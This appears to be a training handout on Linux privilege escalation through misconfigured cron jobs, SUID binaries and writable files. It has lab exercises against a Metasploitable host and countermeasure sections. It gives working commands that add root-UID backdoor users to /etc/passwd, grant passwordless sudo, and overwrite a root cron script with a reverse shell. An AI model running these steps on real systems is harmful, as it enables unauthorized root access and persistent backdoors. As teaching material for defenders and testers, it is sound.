# Missconfiguration
## Cron Jobs
Cron is a program that allows users of Unix systems to automatically execute scripts, commands or software at a pre-specified date and time, or on a pre-defined cycle.
Cron jobs, if not configured properly, can be exploited to gain root privileges.

**How Does Cron Work?** 

The behavior of the Cron utility can be fully customized. You can configure the behavior of Cron by editing files called “crontabs”. Unix keeps different copies of crontabs for each user. You can edit your own user’s crontab by running:
````
crontab -e
````
You can also list the current cronjobs for your user by running:

````
crontab -l
````
In Linux systems, the location for the system-wide crontab is /etc/crontab. Cron will run as the root user when executing scripts and commands in this file.

Files in /etc/cron.d are treated the same way as /etc/crontab. They are effectively “crontab snippets”. Their benefit is that they can be added or removed without modifying the central /etc/crontab file.

````
msfadmin@metasploitable:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
````

Each line starting with * or some number is considered as a cron job or task. It is the magic line that cron service will execute.


**Cron enumeration :**
Questions you need to ask yourself:  
1. Are there scripts or binary files in cron jobs that are writable?
2. Can we write to the cron file itself.
3. Is the cron.d directory writable?


To view root’s cron jobs.
````
crontab -l
````

View a user's cron jobs.
````
crontab -u username -l
````

View all the daily cron jobs.
````
ls -la /etc/cron.daily/
````

View a specific daily cron job.
````
less /etc/cron.daily/logrotate
````

You can also list the current cronjobs for your user by running:
````
crontab -l
````

If Cron tasks have been created with elevated privileges, you may not be able to see the created tasks. 
To solve this problem you can use [pspy](https://github.com/DominicBreuker/pspy)

pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.

````
./pspy32 

2022/08/02 05:30:01 CMD: UID=0    PID=9127   | 
2022/08/02 05:30:01 CMD: UID=256  PID=9126   | bash /var/www/backup.sh 
2022/08/02 05:30:01 CMD: UID=32   PID=9125   | /USR/SBIN/CRON 
````

----
**Exercise :**
- IP : 10.12.1.36
- ID : alice
- PASSWORD : alice

Connect to 10.12.1.36 with alice account.

- Download pspy32 in a folder ``/home/alice/your-name/``.
    > scp pspy32 alice@10.12.1.36:/home/alice/Kramer

- For pspy32 to work, you must give it execution rights. 
    > chmod +x pspy32

- Wait 5 minutes, you can go get a coffee.

- Is there a process to launch? If so, which one?
    > A backup script.

- What is the file that is executed?
    > /var/www/backup.sh

- Do you have write permissions on this file?
    > Yes.
    > -rwxrwxrwx  1 firefart root          51 2022-07-31 13:10 backup.sh

- Do a test by overwriting the file with a command line to start a [reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

- Wait 5 minutes, you can check your email.

AND BIM!

---- 

**Countermeasures :**
If your system uses Cron to automate tasks, make sure that none of the scripts that you run through crontab are editable by unprivileged users, and make sure that your Cron scripts are secure!

NEVER EXECUTE COMMANDS WITH sudo or root user and avoid using SUID binaries in the job.

## SUID/SGID
SUID, which stands for set user ID, is a Linux feature that allows users to execute a file with the permissions of a specified user. For example, the Linux ping command typically requires root permissions to open raw network sockets. By marking the ping program as SUID with the owner as root, ping executes with root privileges whenever a low-privileged user runs the program.

````
alice@metasploitable:~$ ls -la /bin | grep rwsr
-rwsr-xr--  1 root fuse  20056 2008-02-26 13:25 fusermount
-rwsr-xr-x  1 root root  81368 2008-04-14 23:36 mount
-rwsr-xr-x  1 root root  30856 2007-12-10 12:33 ping
-rwsr-xr-x  1 root root  26684 2007-12-10 12:33 ping6
-rwsr-xr-x  1 root root  25540 2008-04-02 21:08 su
-rwsr-xr-x  1 root root  63584 2008-04-14 23:36 umount
````
SUID is a feature that, when used correctly, actually improves Linux security. The problem is that administrators can unknowingly introduce dangerous SUID configurations when installing third-party applications or making logical configuration changes.

Many system administrators don't know where to set the SUID bit and where not to. The SUID bit should not be set, especially on a file editor, because an attacker can overwrite all files on the system.

----
**Exercise :**
- IP : 10.12.1.36
- ID : alice
- PASSWORD : alice

Connect to 10.12.1.36 with alice account.

- Display the executables whose SUID bit is set.
 ````
alice@metasploitable:~$ ls -la /bin | grep rwsr
-rwsr-xr--  1 root fuse  20056 2008-02-26 13:25 fusermount
-rwsr-xr-x  1 root root  81368 2008-04-14 23:36 mount
-rwsr-xr-x  1 root root  30856 2007-12-10 12:33 ping
-rwsr-xr-x  1 root root  26684 2007-12-10 12:33 ping6
-rwsr-xr-x  1 root root  25540 2008-04-02 21:08 su
-rwsr-xr-x  1 root root  63584 2008-04-14 23:36 umount
````

- [Look at the gtfobins site to see which executable would give you root privileges](https://gtfobins.github.io/)
    > None.

- Execute de the command.
- What is the executable that is exploitable and has the possibility to configure the suid? 
    > N/A

And BIM !
<details>
  <summary>Hints</summary>
  The name of the executable starts with ``n``
</details>

---- 

**Countermeasures :**
The SUID bit should not be set on a program that allows you to escape to the shell.
You should never set the SUID bit on a file editor/compiler/interpreter because an attacker can easily read/overwrite all files on the system.

## Interesting Files writable
List world writable files on the system.
```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```
**Writable /etc/passwd**

First generate a password with one of the following commands.

```powershell
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user `hacker` and add the generated password.

```powershell
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

You can now use the `su` command with `hacker:hacker`

Alternatively you can use the following lines to add a dummy user without a password.    
WARNING: you might degrade the current security of the machine.

```bash
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 

**Writable /etc/sudoers**

```powershell
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```
